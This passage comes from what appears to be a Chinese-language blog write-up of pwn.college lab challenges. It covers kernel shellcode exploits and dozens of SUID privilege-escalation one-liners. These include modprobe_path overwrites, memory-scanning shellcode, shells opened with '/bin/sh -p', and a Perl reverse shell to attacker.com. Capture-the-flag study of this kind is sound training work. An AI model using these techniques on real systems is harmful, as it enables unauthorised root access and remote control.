:p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>):<br>    p = process([<span class="hljs-string">&quot;./exp&quot;</span>,<span class="hljs-built_in">str</span>((i % <span class="hljs-number">1024</span>) * <span class="hljs-number">0x100000</span>)])<br>    p.recv()<br>    sleep(<span class="hljs-number">0.5</span>)<br>    p.close()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L11-0-L11-1"><a class="header-anchor" href="#L11-0-L11-1">Â¶</a>L11.0,L11.1</h2><p>åº”è¯¥æ˜¯é€ƒè¯¾æ‰“æ³•ï¼Œkernel shellcode ğŸ‘ æ‰ <code>modprobe_path</code> å <code>jmp $</code> å¡æ­»åŸç¨‹åºï¼ˆä¿ä½å­ç¨‹åºï¼‰ï¼Œå¼€å¦å¤–ä¸€ä¸ª shell èµ· gdb å»å†…å­˜æ‹¿ flag å³å¯ã€‚</p><p><img src="D:/Blog/n1ghtu/source/_posts/pwncollege.assets/image-20221116161222451.png" alt="image-20221116161222451"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">kernel_shellcode = asm(<span class="hljs-string">&quot;mov rax,0xffffffff82444880;mov r8,0x6161612f706d742f;mov qword ptr [rax],r8;ret;&quot;</span>)<br>shellcode = asm(shellcraft.pushstr(kernel_shellcode)+shellcraft.write(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)+shellcraft.infloop())<br>sla(<span class="hljs-string">&quot;shellcode from stdin&quot;</span>,shellcode)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">system(<span class="hljs-string">&quot;echo &#x27;#!/bin/sh\n/bin/cp /bin/sh /tmp/sh\n/bin/chmod u+s /tmp/sh&#x27; &gt; /tmp/aaadprobe&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/aaadprobe&quot;</span>);<br>system(<span class="hljs-string">&quot;echo &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/nightu&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="L12-L12-1"><a class="header-anchor" href="#L12-L12-1">Â¶</a>L12,L12.1</h2><p>æ²¡åŠæ³•é€ƒè¯¾äº† =ã€‚= æŒ‰è§†é¢‘è€å®ç‚¹å†™ä¸ªæœç´¢å†…å­˜ï¼ŒæˆåŠŸç‡è›®é«˜çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&quot;/challenge/babykernel_level12.0&quot;</span>)<br><span class="hljs-comment"># for i in range(1024):</span><br><span class="hljs-comment">#     p = process([&quot;./exp&quot;,str((i % 1024) * 0x100000)])</span><br><span class="hljs-comment">#     p.recv()</span><br><span class="hljs-comment">#     sleep(0.5)</span><br><span class="hljs-comment">#     p.close()</span><br><span class="hljs-comment"># ffffffff81089580 t run_cmd</span><br>kernel_shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                        mov rdi, 0xffff88807cffffff;</span><br><span class="hljs-string">                        lea r11, [rip + target];</span><br><span class="hljs-string">                        mov r11, [r11];</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        top_of_loop:</span><br><span class="hljs-string">                            cmp r11,[rdi];</span><br><span class="hljs-string">                            je success;</span><br><span class="hljs-string">                            dec rdi;</span><br><span class="hljs-string">                            jmp top_of_loop;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        success:</span><br><span class="hljs-string">                            push r11;</span><br><span class="hljs-string">                            push rdi;</span><br><span class="hljs-string">                            mov  rax, 0xffffffff810b6309;</span><br><span class="hljs-string">                            call rax;</span><br><span class="hljs-string">                            pop rdi;</span><br><span class="hljs-string">                            pop r11;</span><br><span class="hljs-string">                            dec rdi;</span><br><span class="hljs-string">                            jmp top_of_loop;</span><br><span class="hljs-string">                            ret;</span><br><span class="hljs-string">                        target:</span><br><span class="hljs-string">                            .string &quot;college&#123;&quot;</span><br><span class="hljs-string">                        &#x27;&#x27;&#x27;</span>)<br><br>user_shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                        mov rax,1</span><br><span class="hljs-string">                        mov rdi,3</span><br><span class="hljs-string">                        lea rsi,[rip + kernel_shellcode]</span><br><span class="hljs-string">                        mov rdx,0x100</span><br><span class="hljs-string">                        syscall</span><br><span class="hljs-string">                        kernel_shellcode:</span><br><span class="hljs-string">                        nop</span><br><span class="hljs-string">                        &#x27;&#x27;&#x27;</span>)<br>user_shellcode += kernel_shellcode<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;12.sc&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(user_shellcode)<br>sl(user_shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1>Program Misuse(51/51)âœ”</h1><h2 id="L1-v2"><a class="header-anchor" href="#L1-v2">Â¶</a>L1</h2><p>ç™½ç»™ï¼Œè¿è¡Œåç›´æ¥ <code>cat /flag</code>ã€‚</p><h2 id="L2-v2"><a class="header-anchor" href="#L2-v2">Â¶</a>L2</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>more /flag</code>ã€‚</p><h2 id="L3"><a class="header-anchor" href="#L3">Â¶</a>L3</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>less /flag</code>ã€‚ä½ å¹²å˜›ï¼Œå“å“Ÿã€‚</p><h2 id="L4"><a class="header-anchor" href="#L4">Â¶</a>L4</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>tail /flag</code>ã€‚</p><h2 id="L5"><a class="header-anchor" href="#L5">Â¶</a>L5</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>head /flag</code>ã€‚æˆ‘çœŸæ²¡åœ¨æ°´åšå®¢ã€‚ğŸ˜¶</p><h2 id="L6"><a class="header-anchor" href="#L6">Â¶</a>L6</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>sort /flag</code>ã€‚è¯¶ï¼Œè¿™ä¸ªå°‘è§çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write sorted concatenation of all FILE(s) to standard output.<br><br>With no FILE, or when FILE is -, <span class="hljs-built_in">read</span> standard input.<br></code></pre></td></tr></table></figure><h2 id="L7"><a class="header-anchor" href="#L7">Â¶</a>L7</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>vim /flag</code>ã€‚</p><h2 id="L8"><a class="header-anchor" href="#L8">Â¶</a>L8</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>emacs /flag</code>ã€‚ğŸ‘´ğŸ» ä¸ä¼šç”¨è¿™ç©æ„ã€‚</p><h2 id="L9"><a class="header-anchor" href="#L9">Â¶</a>L9</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>nano /flag</code>ã€‚å’‹è¿˜æ¥ã€‚</p><h2 id="L10"><a class="header-anchor" href="#L10">Â¶</a>L10</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>rev /flag</code>ã€‚æ‹¿å‡ºæ¥ä¸¢ <a href="https://gchq.github.io/CyberChef/#recipe=Reverse('Character')&amp;input=fVd6TTFOVGNzTVRVeVhRLnhVYlVqMHpyQjVTU2ZQWVNYLXBOU3VINkNKMHtlZ2VsbG9jLm53cA">Cyberchef</a> rev ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><h2 id="L11"><a class="header-anchor" href="#L11">Â¶</a>L11</h2><p>æ­£ç»äººè°çœŸçš„çœ‹ od å•Šï¼ˆbushi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level11:/$ <span class="hljs-built_in">od</span> -xa /flag<br>0000000    7770    2e6e    6f63    6c6c    6765    7b65    7934    3059<br>          p   w   n   .   c   o   l   l   e   g   e   &#123;   4   y   Y   0<br>...<br>0000060    4e54    4d31    577a    0a7d<br>          T   N   1   M   z   W   &#125;  <span class="hljs-built_in">nl</span><br>0000070<br></code></pre></td></tr></table></figure><p>ç„¶å py å†™ä¸ªè„šæœ¬ replace ä¸€ä¸‹å°±å‡ºäº†ã€‚</p><h2 id="L12"><a class="header-anchor" href="#L12">Â¶</a>L12</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>xd /flag</code>ã€‚</p><h2 id="L13"><a class="header-anchor" href="#L13">Â¶</a>L13</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>xxd /flag</code>ã€‚</p><h2 id="L14"><a class="header-anchor" href="#L14">Â¶</a>L14</h2><p>ğŸ‘´ğŸ» å¥½åƒå¿˜äº†æ˜¯å•¥äº†ï¼Œå¥½åƒä¹Ÿä¸é‡è¦å°±ä¸å›å¤´åšäº†ã€‚</p><h2 id="L15"><a class="header-anchor" href="#L15">Â¶</a>L15</h2><p>åŒä¸Šï¼Œæ¢æˆäº† <code>base32 /flag</code>ã€‚ æœ‰å¿…è¦è¿™ä¹ˆå¤šå— ğŸ˜¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level15:/$ <span class="hljs-built_in">echo</span> `<span class="hljs-built_in">base64</span> /flag`|<span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><h2 id="L16"><a class="header-anchor" href="#L16">Â¶</a>L16</h2><p>split åæ‹¿flagã€‚</p><h2 id="L17"><a class="header-anchor" href="#L17">Â¶</a>L17</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip -c flag &gt; tmp/flag.gz<br></code></pre></td></tr></table></figure><h2 id="L18"><a class="header-anchor" href="#L18">Â¶</a>L18</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bzip2 -c flag &gt; tmp/flag.bzip2<br></code></pre></td></tr></table></figure><h2 id="L19"><a class="header-anchor" href="#L19">Â¶</a>L19</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip /tmp/flag.zip /flag<br></code></pre></td></tr></table></figure><h2 id="L20"><a class="header-anchor" href="#L20">Â¶</a>L20</h2><p>tar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/flag<br>tar xf <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> -I <span class="hljs-string">&#x27;/bin/sh -c &quot;cat 1&gt;&amp;2&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="L21"><a class="header-anchor" href="#L21">Â¶</a>L21</h2><p>ar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -u)<br>LFILE=/flag<br>ar r <span class="hljs-string">&quot;<span class="hljs-variable">$TF</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span><br><span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TF</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="L22"><a class="header-anchor" href="#L22">Â¶</a>L22</h2><p>cpio</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/flag<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | cpio -o<br></code></pre></td></tr></table></figure><h2 id="L23"><a class="header-anchor" href="#L23">Â¶</a>L23</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/flag<br>genisoimage -<span class="hljs-built_in">sort</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="L24"><a class="header-anchor" href="#L24">Â¶</a>L24</h2><p>env</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> /bin/sh -p<br></code></pre></td></tr></table></figure><h2 id="L25"><a class="header-anchor" href="#L25">Â¶</a>L25</h2><p>find</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br></code></pre></td></tr></table></figure><h2 id="L26"><a class="header-anchor" href="#L26">Â¶</a>L26</h2><p>make</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMAND=<span class="hljs-string">&#x27;/bin/sh -p&#x27;</span><br>make -s --<span class="hljs-built_in">eval</span>=$<span class="hljs-string">&#x27;x:\n\t-&#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$COMMAND</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="L27"><a class="header-anchor" href="#L27">Â¶</a>L27</h2><p>nice</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nice</span> /bin/sh -p<br></code></pre></td></tr></table></figure><h2 id="L28"><a class="header-anchor" href="#L28">Â¶</a>L28</h2><p>timeout</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">timeout</span> 7d /bin/sh -p<br></code></pre></td></tr></table></figure><h2 id="L29"><a class="header-anchor" href="#L29">Â¶</a>L29</h2><p>stdbuf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stdbuf</span> -i0 /bin/sh -p<br></code></pre></td></tr></table></figure><h2 id="L30"><a class="header-anchor" href="#L30">Â¶</a>L30</h2><p>setarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setarch $(<span class="hljs-built_in">arch</span>) /bin/sh -p<br></code></pre></td></tr></table></figure><h2 id="L31"><a class="header-anchor" href="#L31">Â¶</a>L31</h2><p>watch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -x sh -p -c <span class="hljs-string">&#x27;reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="L32"><a class="header-anchor" href="#L32">Â¶</a>L32</h2><p>socat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/flag<br>socat -u <span class="hljs-string">&quot;file:<span class="hljs-variable">$LFILE</span>&quot;</span> -<br><br>LFILE=file_to_write<br>socat -u <span class="hljs-string">&#x27;exec:echo DATA&#x27;</span> <span class="hljs-string">&quot;open:<span class="hljs-variable">$LFILE</span>,creat&quot;</span><br></code></pre></td></tr></table></figure><h2 id="L33"><a class="header-anchor" href="#L33">Â¶</a>L33</h2><p>whiptail</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whiptail --textbox /flag 10 60<br></code></pre></td></tr></table></figure><h2 id="L34"><a class="header-anchor" href="#L34">Â¶</a>L34</h2><p>awk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;//&#x27;</span> /flag<br></code></pre></td></tr></table></figure><h2 id="L35"><a class="header-anchor" href="#L35">Â¶</a>L35</h2><p>sed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed <span class="hljs-string">&#x27;&#x27;</span> /flag<br></code></pre></td></tr></table></figure><h2 id="L36"><a class="header-anchor" href="#L36">Â¶</a>L36</h2><p>ed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ed file_to_read<br>,p<br>q<br></code></pre></td></tr></table></figure><h2 id="L37"><a class="header-anchor" href="#L37">Â¶</a>L37</h2><p>chown</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> hacker:hacker /flag<br></code></pre></td></tr></table></figure><h2 id="L38"><a class="header-anchor" href="#L38">Â¶</a>L38</h2><p>chmod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 /flag<br></code></pre></td></tr></table></figure><h2 id="L39"><a class="header-anchor" href="#L39">Â¶</a>L39</h2><p>cp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_write<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> | ./cp /dev/stdin <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span><br><br>LFILE=file_to_write<br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> &gt; <span class="hljs-variable">$TF</span><br>./cp <span class="hljs-variable">$TF</span> <span class="hljs-variable">$LFILE</span><br><br><span class="hljs-built_in">cp</span> /flag /dev/stdout<br></code></pre></td></tr></table></figure><h2 id="L40"><a class="header-anchor" href="#L40">Â¶</a>L40</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_write<br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> &gt; <span class="hljs-variable">$TF</span><br>./mv <span class="hljs-variable">$TF</span> <span class="hljs-variable">$LFILE</span><br></code></pre></td></tr></table></figure><h2 id="L41"><a class="header-anchor" href="#L41">Â¶</a>L41</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="hljs-built_in">export</span> RHOST=attacker.com<br><span class="hljs-built_in">export</span> RPORT=12345<br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;$ENV&#123;RHOST&#125;&quot;;$p=$ENV&#123;RPORT&#125;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -ne <span class="hljs-built_in">print</span> /flag<br></code></pre></td></tr></table></figure><h2 id="L40-v2"><a class="header-anchor" href="#L40-v2">Â¶</a>L40</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211151853541.png" alt="image-20221115185259666"></p><p>é¢˜ç›®ç»™çš„è¿™ä¸ªç©æ„ç»™ mv åŠ  suid æƒé™ï¼Œæˆ‘ä»¬ç”¨ mv æŠŠå…¶ä»–ç¨‹åºæ‹¿è¿‡æ¥ ğŸ‘ æˆ mv å°±å¯ä»¥ç»™å…¶ä»–ç¨‹åºåŠ  suid æƒé™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level40:/$ <span class="hljs-built_in">mv</span> /bin/chmod /bin/mv<br>hacker@babysuid_level40:/$ /usr/bin/mv 4777 /flag<br>hacker@babysuid_level40:/$ <span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h2 id="L42"><a class="header-anchor" href="#L42">Â¶</a>L42</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="L43"><a class="header-anchor" href="#L43">Â¶</a>L43</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level43:/$ irb<br>irb(main):001:0&gt; `/bin/cat /flag`<br></code></pre></td></tr></table></figure><h2 id="L44"><a class="header-anchor" href="#L44">Â¶</a>L44</h2><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level44:/$ bash -p<br>bash-5.0<span class="hljs-comment"># cat /flag</span><br></code></pre></td></tr></table></figure><h2 id="L45"><a class="header-anchor" href="#L45">Â¶</a>L45</h2><p>date</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level45:/$ <span class="hljs-built_in">date</span> -f /flag<br><span class="hljs-built_in">date</span>: invalid <span class="hljs-built_in">date</span><br></code></pre></td></tr></table></figure><h2 id="L46"><a class="header-anchor" href="#L46">Â¶</a>L46</h2><p>dmesg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level46:/$ dmesg -rF /flag<br></code></pre></td></tr></table></figure><h2 id="L47"><a class="header-anchor" href="#L47">Â¶</a>L47</h2><p>wc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level47:/$ <span class="hljs-built_in">wc</span> --files0-from /flag<br></code></pre></td></tr></table></figure><h2 id="L48"><a class="header-anchor" href="#L48">Â¶</a>L48</h2><p>gcc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_delete<br>gcc -xc /dev/null -o <span class="hljs-variable">$LFILE</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level48:/$ gcc -x c -E /flag<br><span class="hljs-comment"># 1 &quot;/flag&quot;</span><br><span class="hljs-comment"># 1 &quot;&lt;built-in&gt;&quot;</span><br><span class="hljs-comment"># 1 &quot;&lt;command-line&gt;&quot;</span><br><span class="hljs-comment"># 31 &quot;&lt;command-line&gt;&quot;</span><br><span class="hljs-comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span><br><span class="hljs-comment"># 32 &quot;&lt;command-line&gt;&quot; 2</span><br><span class="hljs-comment"># 1 &quot;/flag&quot;</span><br></code></pre></td></tr></table></figure><h2 id="L49"><a class="header-anchor" href="#L49">Â¶</a>L49</h2><p>as</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/$ as @/flag<br>Assembler messages:<br></code></pre></td></tr></table></figure><h2 id="L50"><a class="header-anchor" href="#L50">Â¶</a>L50</h2><p>wget</p><figure 